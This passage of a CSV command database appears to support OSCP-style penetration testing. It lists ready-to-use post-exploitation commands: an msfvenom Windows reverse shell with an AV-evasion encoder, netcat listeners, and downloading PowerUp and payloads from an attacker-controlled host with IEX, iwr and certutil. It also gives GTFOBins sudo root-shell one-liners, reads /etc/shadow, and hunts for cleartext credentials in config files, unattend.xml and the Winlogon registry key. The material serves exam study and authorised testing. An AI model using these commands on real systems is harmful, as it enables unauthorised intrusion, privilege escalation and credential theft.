executable""}","","[""win-msfvenom-service-exe""]","[""win-transfer-payload"", ""win-service-binary-replace""]"
"win-msfvenom-service-exe","Generate Reverse Shell Service Payload (msfvenom)","post-exploit","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o service.exe","Generate Windows reverse shell executable using msfvenom. Alternative to custom C payload when reverse shell callback is preferred.","service-binary-hijacking","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f exe -o service.exe","Run on Kali Linux.

Start listener BEFORE triggering payload:
  nc -lvnp <LPORT>

Payload variations:
  32-bit: windows/shell_reverse_tcp (no x64)
  Meterpreter: windows/x64/meterpreter/reverse_tcp
  Staged: windows/x64/shell/reverse_tcp

AV Evasion (if needed):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x64/xor_dynamic -o service.exe

Service will fail to start properly (reverse shell doesn't return like service binary should), but shell connects before failure.

Time estimate: 5 seconds generation + service restart time

More reliable for services: Use adduser.c approach which executes and exits cleanly.","high","","{""purpose"": ""Generate reverse shell payload for service binary hijacking"", ""manual_alternative"": ""Cross-compile custom C code with reverse shell"", ""common_failures"": [""AV detection blocks payload"", ""Wrong architecture (32/64 bit mismatch)"", ""Firewall blocks reverse connection""], ""when_to_use"": [""When immediate SYSTEM shell preferred"", ""When network allows reverse connections"", ""Quick exploitation without custom code""], ""time_estimate"": ""5 seconds""}","","{""No callback received"": ""Check firewall, verify LHOST/LPORT, ensure listener started before payload"", ""Service fails after connection"": ""Expected - reverse shell doesn't behave like proper service"", ""AV blocks payload"": ""Use encoder (-e) or custom C payload instead""}","{""-p windows/x64/shell_reverse_tcp"": ""Payload: Windows 64-bit reverse TCP shell"", ""LHOST="": ""Listener host (attacker IP)"", ""LPORT="": ""Listener port"", ""-f exe"": ""Output format: Windows executable"", ""-o service.exe"": ""Output filename""}","","[""win-cross-compile-adduser""]","[""win-transfer-payload"", ""win-service-binary-replace"", ""nc-listener-start""]"
"win-localgroup-admins-check","Verify User Added to Administrators Group","post-exploit","Get-LocalGroupMember administrators","List members of local Administrators group to verify adduser payload successfully created and added user.","service-binary-hijacking","","Run after service restart/reboot.

Expected output if successful:
  ObjectClass Name                      PrincipalSource
  ----------- ----                      ---------------
  User        <HOSTNAME>\dave2          Local

If user NOT present:
- Binary may not have executed
- Service may run as non-SYSTEM account
- AV may have blocked execution
- Check Event Viewer for service errors

CMD alternative:
  net localgroup administrators

Time estimate: 1 second","high","","{""purpose"": ""Confirm successful privilege escalation via adduser payload"", ""manual_alternative"": ""net localgroup administrators"", ""common_failures"": [""User not created (payload didn't execute)"", ""Access denied viewing group""], ""when_to_use"": [""After service restart/reboot"", ""Verifying adduser payload success""], ""time_estimate"": ""1 second""}","","{""New user not present"": ""Check Event Viewer > Windows Logs > System for service errors"", ""Access denied"": ""Still low-priv - exploitation failed""}","{""Get-LocalGroupMember"": ""PowerShell cmdlet to list group members"", ""administrators"": ""Built-in local Administrators group""}","[""win-shutdown-reboot""]","","[""win-runas-new-admin"", ""win-ps-credential-new-admin""]"
"win-powerup-modifiable-service","PowerUp - Find Modifiable Service Binaries","post-exploit","Get-ModifiableServiceFile","PowerUp.ps1 function to automatically identify services where current user can modify the service binary. Quick automated check for service binary hijacking.","service-binary-hijacking","","Requires PowerUp.ps1 to be loaded first:
  . .\PowerUp.ps1
  OR
  IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')

Output fields explained:
  ServiceName: Name of vulnerable service
  Path: Full binary path with arguments
  ModifiableFile: Specific file that's writable
  ModifiableFilePermissions: Permissions granted (WriteOwner, Delete, etc.)
  ModifiableFileIdentityReference: Principal with permissions (BUILTIN\Users)
  StartName: Account service runs as (LocalSystem = SYSTEM)
  AbuseFunction: Suggested exploitation function
  CanRestart: Whether current user can restart service

KNOWN BUG: PowerUp's Install-ServiceBinary may fail if service path contains arguments with paths (e.g., --defaults-file=c:\xampp\mysql\bin\my.ini).
Workaround: Use manual exploitation when AbuseFunction fails.

Time estimate: 10-30 seconds

Bypass execution policy:
  powershell -ep bypass
  . .\PowerUp.ps1
  Get-ModifiableServiceFile","high","","{""purpose"": ""Automated detection of exploitable service binaries"", ""manual_alternative"": ""Manual: Get-CimInstance + icacls for each service"", ""common_failures"": [""Script blocked by execution policy (use -ep bypass)"", ""AMSI blocks script (use bypass or obfuscation)"", ""False negatives with complex service paths""], ""when_to_use"": [""Initial privilege escalation enumeration"", ""Quick automated check before manual enum""], ""time_estimate"": ""10-30 seconds"", ""technical_notes"": [""PowerUp may miss some vulnerabilities (see known bug)"", ""Always verify findings manually before exploitation""]}","","{""Script cannot be loaded"": ""Use: powershell -ep bypass"", ""AMSI blocks script"": ""Need AMSI bypass before loading PowerUp"", ""No results but manual check shows vulnerability"": ""Known PowerUp bug - use manual exploitation"", ""AbuseFunction fails"": ""Service path contains arguments with paths - use manual method""}","{""Get-ModifiableServiceFile"": ""PowerUp function that enumerates services, checks binary permissions, and returns exploitable targets""}","[""win-powerup-import""]","","[""win-powerup-install-service-binary"", ""win-icacls-binary-check""]"
"win-powerup-install-service-binary","PowerUp - Automatic Service Binary Exploitation","post-exploit","Install-ServiceBinary -Name '<SERVICE_NAME>'","PowerUp function to automatically exploit writable service binary. Creates local admin user john:Password123! by default.","service-binary-hijacking","Install-ServiceBinary -Name 'mysql'","DEFAULT CREDENTIALS CREATED:
  Username: john
  Password: Password123!

Custom user/password:
  Install-ServiceBinary -Name '<SERVICE>' -UserName 'newuser' -Password 'P@ssw0rd!'

Custom command:
  Install-ServiceBinary -Name '<SERVICE>' -Command 'net localgroup administrators dave /add'

KNOWN BUG WARNING:
Install-ServiceBinary fails when service PathName contains arguments with paths.
Example that breaks PowerUp:
  C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql

Workaround: Use manual exploitation (backup binary, transfer payload, replace, restart).

Still requires service restart after running:
- If CanRestart: True - try Invoke-ServiceAbuse
- If CanRestart: False - need reboot

Time estimate: 5 seconds + restart time","medium","","{""purpose"": ""Automated exploitation of writable service binary"", ""manual_alternative"": ""Manual binary replacement method"", ""common_failures"": [""PathName with arguments causes failure (known bug)"", ""Cannot restart service (use reboot)""], ""when_to_use"": [""When Get-ModifiableServiceFile finds vulnerable service"", ""Service path doesn't contain path-like arguments""], ""time_estimate"": ""5 seconds""}","","{""not modifiable by the current user"": ""Known PowerUp bug with complex paths - use manual method"", ""Cannot restart service"": ""Use reboot if SeShutdownPrivilege available""}","{""Install-ServiceBinary"": ""PowerUp function to replace service binary with payload"", ""-Name"": ""Service name to exploit""}","[""win-powerup-modifiable-service""]","","[""win-shutdown-reboot"", ""win-localgroup-admins-check""]"
"win-transfer-iwr","Transfer Payload to Target (PowerShell)","post-exploit","iwr -uri http://<LHOST>/<FILENAME> -Outfile <DESTINATION>","Download payload from attacker's web server using PowerShell Invoke-WebRequest.","service-binary-hijacking","iwr -uri http://192.168.45.5/adduser.exe -Outfile C:\Users\dave\adduser.exe","Start web server on Kali FIRST:
  python3 -m http.server 80
  OR
  sudo systemctl start apache2 (files in /var/www/html/)

Certutil alternative:
  certutil -urlcache -f http://<LHOST>/<FILE> <DEST>

Verify download:
  dir <DESTINATION>

Time estimate: 2-5 seconds (depending on network)","high","","{""purpose"": ""Transfer exploit payload from attacker to target"", ""manual_alternative"": ""certutil -urlcache -f http://<URL> <DEST>"", ""common_failures"": [""Web server not running"", ""Firewall blocking connection"", ""File permissions on destination""], ""time_estimate"": ""2-5 seconds""}","","","{""iwr"": ""Alias for Invoke-WebRequest"", ""-uri"": ""URL to download from"", ""-Outfile"": ""Local path to save downloaded file""}","[""win-cross-compile-adduser""]","","[""win-service-binary-replace""]"
"check-sudo-privs","Check Sudo Privileges","post-exploit","sudo -l","List commands current user can run with sudo. First step in sudo privilege escalation.","linux-sudo","","ALWAYS run this first before SUID enumeration.

Takes <5 seconds vs 2+ minutes for SUID scan.

NOPASSWD entries are instant root with no exploitation complexity.","high","","","","{""Password required for sudo -l"": ""Uncommon but possible. User must be in sudoers but sudo -l requires password. Try: echo '<password>' | sudo -S -l"", ""User may not run sudo"": ""User not in sudoers file. Try alternatives: SUID binaries (find / -perm -4000), capabilities (getcap -r /), cron jobs"", ""sudo not installed"": ""Extremely rare on production systems. Use alternative privilege escalation: SUID, capabilities, kernel exploits""}","{""-l"": ""List user's allowed sudo commands. Shows format: (run_as) NOPASSWD: /path/to/command"", ""-ll"": ""Long listing format with more details (alternative)"", ""NOPASSWD"": ""Commands runnable without password - major win"", ""(ALL)"": ""Can run as any user (typically root)"", ""env_keep"": ""Environment variables preserved with sudo (LD_PRELOAD = exploitable)""}","","","[""analyze-sudoers"", ""gtfobins-sudo-lookup""]"
"analyze-sudoers","Analyze Sudoers Configuration","post-exploit","echo 'Manual analysis step: Review sudo -l output for exploitable configurations'","Identify exploitable sudo configurations: (1) NOPASSWD entries, (2) GTFOBins binaries, (3) Wildcards, (4) env_keep=LD_PRELOAD","linux-sudo","","Key exploitable patterns:
(1) find, vim, nmap, less, more - spawn shells, (2) python, perl, ruby, awk - execute commands, (3) base64, xxd, od - read files, (4) env_keep+=LD_PRELOAD - shared library injection","high","","","","{""Only standard commands"": ""Standard commands like 'systemctl restart apache2' are rarely exploitable. Look for: find, vim, less, more, python, perl, awk, tar, zip"", ""Wildcard but no obvious exploit"": ""Wildcards enable command injection. Example: sudo /usr/bin/find /path/* -exec /bin/bash \\;"", ""No NOPASSWD entries"": ""Commands requiring password can still be exploited if you have password. Focus on GTFOBins binaries even with PASSWD requirement""}","","[""check-sudo-privs""]","","[""gtfobins-sudo-lookup""]"
"gtfobins-sudo-lookup","GTFOBins Sudo Technique Lookup","post-exploit","echo 'Visit: https://gtfobins.github.io/ and search for binary name. Navigate to Sudo section.'","Manual step: Lookup sudo exploitation technique for discovered binary on GTFOBins website","linux-sudo","","Common GTFOBins sudo techniques:
(1) Shell spawning:
sudo find .

-exec /bin/bash \; -quit, (2) Command execution:
sudo python -c 'import os; os.system(""/bin/bash"")', (3) File reading:
sudo base64 /etc/shadow | base64 -d","high","","","","{""Binary not on GTFOBins"": ""Try searchsploit or manual analysis. Check 'man <binary>' for interactive modes or file reading capabilities"", ""No Sudo section"": ""Check SUID or Capabilities sections - techniques may be adaptable. Many SUID techniques work with sudo if binary reads files or spawns shells"", ""Technique requires flags not allowed"": ""Sudoers may restrict flags. Example: 'sudo /usr/bin/vim' but not 'sudo /usr/bin/vim -c'. Try different GTFOBins technique for same binary""}","","[""analyze-sudoers""]","","[""execute-sudo-exploit""]"
"execute-sudo-exploit","Execute Sudo Exploitation","post-exploit","sudo <SUDO_BINARY> <EXPLOIT_FLAGS>","Template command for sudo exploitation. Replace <SUDO_BINARY> with binary from parser (find, vim, python, etc.) and <EXPLOIT_FLAGS> with GTFOBins technique","linux-sudo","sudo find . -exec /bin/bash \; -quit","Common exploits:
(1) sudo find .

-exec /bin/bash \; -quit, (2) sudo vim -c ':!/bin/bash', (3) sudo less /etc/profile (then !bash), (4) sudo python -c 'import os; os.system(""/bin/bash"")', (5) sudo nmap --interactive (then !sh)","high","","","","{""Password required"": ""NOPASSWD not set for this command. Check sudo -l output again. May need to specify exact command path: sudo /usr/bin/find vs sudo find"", ""Shell not privileged"": ""Verify GTFOBins technique is correct. Some binaries require specific flags. Example: bash needs -p to preserve privileges in SUID (not sudo)"", ""Command path matters"": ""Sudoers may specify exact path. If sudo -l shows '/usr/bin/find', must use: sudo /usr/bin/find (not: sudo find)""}","{""sudo"": ""Run command with root privileges"", ""<SUDO_BINARY>"": ""Binary with NOPASSWD sudo access (replaced from parser)"", ""<EXPLOIT_FLAGS>"": ""GTFOBins exploitation technique (varies by binary)""}","[""gtfobins-sudo-lookup""]","[""sudo-exploit-find"", ""sudo-exploit-vim"", ""sudo-exploit-python"", ""sudo-exploit-less"", ""sudo-exploit-nmap""]","[""verify-root-access-sudo""]"
"sudo-exploit-find","Sudo Find Exploitation","post-exploit","sudo find . -exec /bin/bash \; -quit","Exploit sudo find to spawn root bash shell via -exec flag","linux-sudo","","Find is one of the most common OSCP sudo quick wins.

Appears in ~30% of OSCP-style privilege escalation scenarios.

Alternative paths:
sudo find /etc -name 'passwd' -exec /bin/bash \;","high","","","","{""Must specify exact path"": ""If sudo -l shows '/usr/bin/find', use: sudo /usr/bin/find . -exec /bin/bash \\; -quit"", ""Semicolon must be escaped"": ""Use \\; not ; otherwise shell interprets it before find sees it"", ""Alternative exec syntax"": ""Can also use: sudo find . -exec /bin/bash -p \\; (-p not needed with sudo, only SUID)""}","{""sudo"": ""Run find with root privileges"", ""find"": ""File search utility (GTFOBins-exploitable)"", ""."": ""Search in current directory (required for find syntax)"", ""-exec"": ""Execute command for each file found"", ""/bin/bash"": ""Spawn bash shell (runs as root via sudo)"", ""\\;"": ""Terminate -exec command (escaped semicolon)"", ""-quit"": ""Exit after first match (prevents multiple shells)""}","[""gtfobins-sudo-lookup""]","","[""verify-root-access-sudo""]"
"sudo-exploit-vim","Sudo Vim Exploitation","post-exploit","sudo vim -c ':!/bin/bash'","Exploit sudo vim to spawn root shell via command execution","linux-sudo","","Vim is extremely common in OSCP environments.

Also check:
vi, nano, emacs, pico - all have similar exploitation techniques via shell execution or command execution","high","","","","{""Interactive mode needed"": ""If -c flag blocked, run: sudo vim (enter editor), then type: :!/bin/bash and press Enter"", ""Restricted vim"": ""Some systems use rvim (restricted). Try: sudo vi or sudo nano (if sudoers allows)"", ""Alternative vim commands"": ""Other exploitation commands: :set shell=/bin/bash then :shell, or :!bash""}","{""sudo"": ""Run vim with root privileges"", ""vim"": ""Text editor (GTFOBins-exploitable)"", ""-c"": ""Execute vim command on startup"", ""':!/bin/bash'"": ""Vim command: run shell command (! = execute, /bin/bash = shell)""}","[""gtfobins-sudo-lookup""]","","[""verify-root-access-sudo""]"
"sudo-exploit-python","Sudo Python Exploitation","post-exploit","sudo python -c 'import os; os.system(""/bin/bash"")'","Exploit sudo python to spawn root shell via os.system()","linux-sudo","","Python is very common in web application servers (www-data user).

Also works with:
perl, ruby, node, php - all have command execution capabilities.

Perl:
sudo perl -e 'exec ""/bin/bash"";'","high","","","","{""Python version matters"": ""Check sudo -l output. May be python2 or python3 specifically. Try: sudo python3 -c ..."", ""Quote escaping"": ""Use single quotes for outer, double quotes for inner: 'os.system(\""/bin/bash\"")'"", ""Alternative modules"": ""Other Python exploitation: subprocess.call(), pty.spawn(), exec()""}","{""sudo"": ""Run python with root privileges"", ""python"": ""Python interpreter (GTFOBins-exploitable)"", ""-c"": ""Execute Python code from command line"", ""'import os; os.system(\""/bin/bash\"")'"": ""Python code: import os module, execute /bin/bash shell""}","[""gtfobins-sudo-lookup""]","","[""verify-root-access-sudo""]"
"sudo-exploit-less","Sudo Less Exploitation","post-exploit","sudo less /etc/profile","Exploit sudo less pager to spawn root shell via interactive command execution (press !bash after less opens)","linux-sudo","","Less/more/man are common OSCP vectors.

Steps:
(1) sudo less <file>, (2) Wait for pager to open, (3) Type:
!bash, (4) Press Enter, (5) Root shell spawned.

Also works with:
!/bin/bash, !sh, !/bin/sh","high","","","","{""Interactive step required"": ""Must wait for less to open file, THEN type: !bash and press Enter"", ""File must exist"": ""Use any readable file: /etc/profile, /etc/passwd, /var/log/syslog"", ""Alternative pagers"": ""Similar technique works with: more, man, vi, vim - all have ! command execution""}","{""sudo"": ""Run less with root privileges"", ""less"": ""File pager (GTFOBins-exploitable)"", ""/etc/profile"": ""Any readable file (needed to open less)"", ""!bash"": ""(After less opens) Execute shell command from less prompt""}","[""gtfobins-sudo-lookup""]","","[""verify-root-access-sudo""]"
"sudo-exploit-nmap","Sudo Nmap Exploitation (Legacy Interactive Mode)","post-exploit","sudo nmap --interactive","Exploit sudo nmap (versions 2.02-5.21) interactive mode to spawn root shell. Only works on old nmap versions.","linux-sudo","","Nmap interactive mode is rare in modern OSCP labs (most use nmap 7.x).

More likely to find:
python, vim, find, less, more.

Keep as alternative for legacy systems or HTB retired machines.","medium","","","","{""Interactive mode removed"": ""Nmap 5.21+ removed --interactive. This technique ONLY works on old systems (Ubuntu 10.04, CentOS 5, etc.)"", ""Alternative if no interactive"": ""Check if nmap scripts are writable: ls -la /usr/share/nmap/scripts/ - if writable, create malicious .nse script"", ""Steps for old nmap"": ""(1) sudo nmap --interactive, (2) Wait for nmap> prompt, (3) Type: !sh, (4) Press Enter""}","{""sudo"": ""Run nmap with root privileges"", ""nmap"": ""Network scanner (GTFOBins-exploitable on old versions)"", ""--interactive"": ""Enter interactive mode (removed in nmap 5.21+)"", ""!sh"": ""(After interactive mode) Execute shell command""}","[""gtfobins-sudo-lookup""]","","[""verify-root-access-sudo""]"
"verify-root-access-sudo","Verify Root Privileges Obtained","post-exploit","whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'","Confirm effective UID is 0 (root) and can access root-only files. Critical verification step before claiming privilege escalation success.","linux-sudo","","OSCP exam requirement:
Take screenshot showing (1) whoami output, (2) id output, (3) contents of proof.txt flag.

Document exact command sequence for report.

Sudo escalation is considered 'clean' privilege escalation (no kernel exploits or crashes).","high","","","","{""UID is 0 but cannot read shadow"": ""Verify effective UID: id -u (should be 0). If not, privilege escalation failed"", ""Shell prompt not showing #"": ""Prompt customization may hide root indicator. Verify with: whoami and id commands"", ""Restricted shell"": ""May have root but restricted shell (rbash). Escape with: BASH_CMDS[a]=/bin/bash;a""}","{""whoami"": ""Display current effective username (should be 'root')"", ""id"": ""Show user/group IDs (should show uid=0 or euid=0)"", ""cat /etc/shadow"": ""Attempt to read shadow file (only root can read)"", ""> /dev/null 2>&1"": ""Redirect output and errors to null (silent test)"", ""&&"": ""AND operator - run next command only if previous succeeded"", ""||"": ""OR operator - run if previous command failed""}","[""execute-sudo-exploit""]","",""
"ps-type-file","Read File Contents","post-exploit","type <FILE_PATH>","Read contents of discovered sensitive files. Critical step after Get-ChildItem searches - found files must be read to extract credentials.","credential-hunting","type C:\xampp\mysql\bin\my.ini","OSCP Critical: This command bridges the gap between finding files and extracting credentials. The 'type' command is a cmd.exe built-in (alias for Get-Content in PowerShell). Alternative: 'Get-Content <FILE_PATH>' or 'cat <FILE_PATH>' in PowerShell. When reading fails due to permissions, note the file path for re-enumeration after gaining higher privileges - this is the 'cyclical enumeration' concept from OSCP Module 17.1.3. Permission denied errors often indicate high-value files containing credentials.","high","","","","{""Access is denied"": ""Current user lacks read permissions. NOTE THIS FILE for re-check after privilege escalation - this is a high-value target. Try 'icacls <FILE_PATH>' to see who can read it."", ""Cannot find path"": ""File was moved or deleted since search. Re-run Get-ChildItem to find current location."", ""File is empty"": ""May be a placeholder or cleared file. Check file size with 'Get-Item <FILE_PATH>' before reading large files.""}","","","[""ps-get-content""]","[""win-net-user-detail"", ""win-runas-cmd""]"
"ps-search-app-config","Search Application Config Files","post-exploit","Get-ChildItem -Path <APP_PATH> -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue","Search any application directory for configuration files containing credentials. Target paths identified from installed applications enumeration.","credential-hunting","Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue","OSCP Critical: After identifying installed applications (KeePass, XAMPP, MySQL, FileZilla, etc.), target their config directories for credential files. Common high-value targets: XAMPP (my.ini with MySQL root password, passwords.txt with defaults), FileZilla (recentservers.xml with saved FTP creds), WAMP (similar to XAMPP). The WHY: Application config files frequently contain database passwords which users reuse for Windows accounts. Manual alternative: dir /s /b C:\xampp\*.ini (cmd.exe). Always read found files with 'type' or 'Get-Content' to extract actual credentials.","high","","","","{""No results found"": ""Application may use non-standard config locations. Check documentation or search broader with -Path C:\\ but this is slower. Also check AppData folders: C:\\Users\\*\\AppData\\*"", ""Too many results"": ""Narrow -Include to specific filenames known to contain credentials: my.ini, passwords.txt, config.php, wp-config.php, settings.py"", ""Application not found at expected path"": ""Use Get-ItemProperty to enumerate installed applications and their actual install paths: Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select InstallLocation""}","{""-Path <APP_PATH>"": ""Target application directory. Identify from Get-ItemProperty enumeration or common paths: C:\\xampp, C:\\wamp64, C:\\Program Files\\<AppName>. Applications like XAMPP store MySQL credentials in my.ini, passwords.txt in their install directory."", ""-Include *.txt,*.ini,*.config,*.xml"": ""Common configuration file extensions. INI files contain settings, TXT may have default passwords, CONFIG files (ASP.NET) have connection strings, XML for various app configs. Adjust based on target application."", ""-File"": ""Match only files, not directories - reduces noise in output"", ""-Recurse"": ""Search all subdirectories. Critical because config files often in nested paths like mysql\\bin\\my.ini"", ""-ErrorAction SilentlyContinue"": ""Suppress 'Access Denied' errors for clean output. Files you can't access are noted for later re-enumeration with higher privileges.""}","[""ps-get-installed-apps""]","","[""ps-type-file"", ""win-net-user-detail""]"
"ps-search-deployment-files","Search Windows Deployment Files","post-exploit","Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf,Unattended.xml -File -Recurse -ErrorAction SilentlyContinue","Search for Windows deployment/unattended installation files that often contain cleartext administrator passwords left by sysadmins.","credential-hunting","","HIGH OSCP VALUE: Windows unattended installation files are created during automated OS deployment and SHOULD be deleted afterward. Sysadmins frequently forget this step. These files contain cleartext or Base64-encoded administrator passwords. Key XML elements to search: <AutoLogon><Password><Value>, <Credentials><Password>, <AdministratorPassword>. Base64 passwords decode easily: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('encoded_password')). Common locations: C:\Windows\Panther\unattend.xml, C:\Windows\System32\Sysprep\sysprep.xml. Quick win that requires no exploitation.","high","","","","{""No results found"": ""Deployment files may have been properly deleted. This is expected on well-maintained systems. Move on to other credential sources."", ""Search is slow"": ""Full C: drive search takes time. Can narrow to common locations: Get-ChildItem -Path C:\\Windows\\Panther,C:\\Windows\\System32\\Sysprep -Include unattend.xml -File -ErrorAction SilentlyContinue"", ""File found but no credentials"": ""Not all deployment files contain passwords. Look for <AutoLogon><Password> or <Credentials><Password> XML elements.""}","{""-Path C:\\"": ""Search entire C: drive. Deployment files can be anywhere but commonly in C:\\Windows\\Panther\\, C:\\Windows\\System32\\Sysprep\\, or root directories."", ""-Include unattend.xml,sysprep.xml,sysprep.inf,Unattended.xml"": ""Target Windows unattended installation answer files. These contain settings for automated Windows deployment including admin credentials. Multiple variants exist: unattend.xml (modern), sysprep.inf (legacy), Unattended.xml (alternate naming)."", ""-File"": ""Match only files, not directories"", ""-Recurse"": ""Search all subdirectories - these files can be in unexpected locations"", ""-ErrorAction SilentlyContinue"": ""Suppress permission errors for clean output""}","","","[""ps-type-file"", ""win-net-user-detail"", ""win-runas-cmd""]"
"ps-search-webconfig","Search Web Server Config Files","post-exploit","Get-ChildItem -Path <WEB_ROOT> -Include web.config,*.config,config.php,wp-config.php,settings.py,appsettings.json -File -Recurse -ErrorAction SilentlyContinue","Search web server document root for configuration files containing database connection strings and credentials.","credential-hunting","Get-ChildItem -Path C:\inetpub\wwwroot -Include web.config,*.config,config.php,wp-config.php,settings.py,appsettings.json -File -Recurse -ErrorAction SilentlyContinue","OSCP Critical: Web config files contain database connection strings with credentials. These database passwords are frequently reused for Windows accounts (credential reuse). Key search patterns after finding files: 'type web.config | Select-String -Pattern ""connectionString|password|pwd|user id""'. ASP.NET web.config stores DB creds in <connectionStrings>. PHP configs use define('DB_PASSWORD', '...'). Django settings.py has DATABASES dict with PASSWORD key. IIS applicationHost.config may have site credentials. Manual alternative: dir /s /b C:\inetpub\*.config","high","","","","{""Web root not found"": ""Identify web server first: Get-Process | Where-Object {$_.Name -match 'httpd|apache|w3wp|nginx'}. Check running services for web server paths."", ""Config found but encrypted"": ""ASP.NET can encrypt web.config sections. Look for other config files or check if encryption key is accessible."", ""No database credentials"": ""Application may use integrated authentication (no password) or credentials in environment variables. Check applicationHost.config for IIS.""}","{""-Path <WEB_ROOT>"": ""Web server document root. Common paths: IIS=C:\\inetpub\\wwwroot, XAMPP=C:\\xampp\\htdocs, WAMP=C:\\wamp64\\www, Custom=identify from httpd.conf or running processes"", ""-Include web.config,*.config,config.php,wp-config.php,settings.py,appsettings.json"": ""Common web config files by technology: ASP.NET (web.config, appsettings.json), PHP (config.php, wp-config.php for WordPress), Python (settings.py for Django). Adjust based on identified web stack."", ""-File"": ""Match only files, not directories"", ""-Recurse"": ""Search all subdirectories - configs may be in app subfolders"", ""-ErrorAction SilentlyContinue"": ""Suppress permission errors""}","[""ps-get-process"", ""ps-get-installed-apps""]","","[""ps-type-file"", ""win-net-user-detail""]"
"ps-search-password-patterns","Search for Password-Named Files","post-exploit","Get-ChildItem -Path <SEARCH_PATH> -Include *password*,*cred*,*secret*,*login*,*backup*.txt,*backup*.xlsx -File -Recurse -ErrorAction SilentlyContinue","Broad search for files with credential-related naming patterns. Catches user-created password files that specific searches miss.","credential-hunting","Get-ChildItem -Path C:\Users -Include *password*,*cred*,*secret*,*login*,*backup*.txt,*backup*.xlsx -File -Recurse -ErrorAction SilentlyContinue","OSCP Relevant: This broad search catches the 'lazy user' credential files that specific searches miss. Users commonly create Desktop files like 'asdf.txt' with meeting notes containing passwords, 'passwords.xlsx' with credential lists, or 'backup_credentials.txt'. The OSCP module example found meeting notes (asdf.txt) with 'Steve's password: securityIsNotAnOption++++++'. Always read found files with 'type' command. Focus on Desktop, Documents, Downloads first. Manual alternative: dir /s /b C:\Users\*password* (slower).","medium","","","","{""Too many results"": ""Narrow search path to specific user directories. Filter by extension: add -Include *password*.txt,*password*.doc to exclude binaries."", ""Search too slow"": ""Full C:\\ search takes time. Prioritize: C:\\Users\\*\\Desktop, C:\\Users\\*\\Documents, C:\\Users\\*\\Downloads"", ""Found file but encrypted"": ""Excel files may be password-protected. Note for potential offline cracking with office2john.""}","{""-Path <SEARCH_PATH>"": ""Search scope. Use C:\\ for comprehensive search (slow), C:\\Users for user files (faster), or specific user home like C:\\Users\\dave for targeted search."", ""-Include *password*,*cred*,*secret*,*login*,*backup*.txt,*backup*.xlsx"": ""Pattern matching for common credential file names. Users create files like 'passwords.txt', 'my_credentials.doc', 'secret_backup.xlsx', 'login_info.txt'. Asterisks match any characters before/after."", ""-File"": ""Match only files, not directories"", ""-Recurse"": ""Search all subdirectories including Desktop, Documents, Downloads"", ""-ErrorAction SilentlyContinue"": ""Suppress permission errors - expected when searching other users' directories""}","[""ps-search-user-docs""]","","[""ps-type-file"", ""win-net-user-detail""]"
"ps-registry-autologon","Extract AutoLogon Credentials","post-exploit","Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName,AutoAdminLogon","Extract cleartext AutoLogon credentials from Windows registry. Commonly configured on kiosk systems, shared workstations, or during deployment.","credential-hunting","","HIGH OSCP VALUE: AutoLogon stores credentials in cleartext in the registry for unattended login. Commonly used on: kiosk systems, shared workstations, lab environments, development machines. When found, these credentials often belong to service accounts or admin users. If AutoAdminLogon=1 but DefaultPassword empty, password may be stored in LSA secrets (requires SYSTEM to extract). Always test found credentials against other accounts - password reuse is common. Quick check that takes seconds - always include in enumeration. Manual alternative: reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultPassword","high","","","","{""DefaultPassword is empty"": ""AutoLogon may not be configured, or password stored using LSA secrets (more secure method). Check if AutoAdminLogon is 1 - if enabled without DefaultPassword, credentials stored elsewhere."", ""Access denied"": ""Should be readable by all users. If denied, may be GPO-restricted environment."", ""Registry path not found"": ""Unlikely on standard Windows. Verify path spelling exactly.""}","{""-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'"": ""Registry path for Windows logon settings. AutoLogon credentials stored here for unattended login. HKLM (HKEY_LOCAL_MACHINE) readable by all users."", ""Select-Object DefaultUserName,DefaultPassword,DefaultDomainName,AutoAdminLogon"": ""Filter output to credential-related values. DefaultUserName=account, DefaultPassword=cleartext password (if set), DefaultDomainName=domain/workgroup, AutoAdminLogon=1 means enabled.""}","","","[""win-net-user-detail"", ""win-runas-cmd""]"
"ps-cmdkey-list","List Saved Credentials","post-exploit","cmdkey /list","List Windows Credential Manager saved credentials including RDP connections, network shares, and generic credentials.","credential-hunting","","OSCP Relevant: While cmdkey doesn't show actual passwords, it reveals what systems the user has saved credentials for - indicating lateral movement targets. TERMSRV entries = saved RDP credentials. If current user has saved RDP creds, can connect to those systems without knowing password: mstsc /v:targetserver. For actual password extraction, need SYSTEM and tools like Mimikatz (sekurlsa::dpapi). Also check RDP connection history: reg query 'HKCU\Software\Microsoft\Terminal Server Client\Servers' to see recently connected servers (potential pivot targets). Manual alternative: control /name Microsoft.CredentialManager (GUI).","medium","","","","{""No credentials listed"": ""User hasn't saved any credentials. This is common - move on to other credential sources."", ""Shows targets but no passwords"": ""Expected - cmdkey shows metadata only. Actual password extraction requires SYSTEM privileges and DPAPI. However, saved RDP credentials can be used with mstsc /v:target if account matches."", ""Need to see other users' credentials"": ""cmdkey shows current user only. After privilege escalation, check other user profiles' Credential Manager.""}","{""/list"": ""Display all stored credentials in Windows Credential Manager for current user. Shows target (server/share), type (Domain Password, Generic), and username. Does NOT display actual passwords (those require SYSTEM or DPAPI extraction).""}","","","[""win-net-user-detail""]"
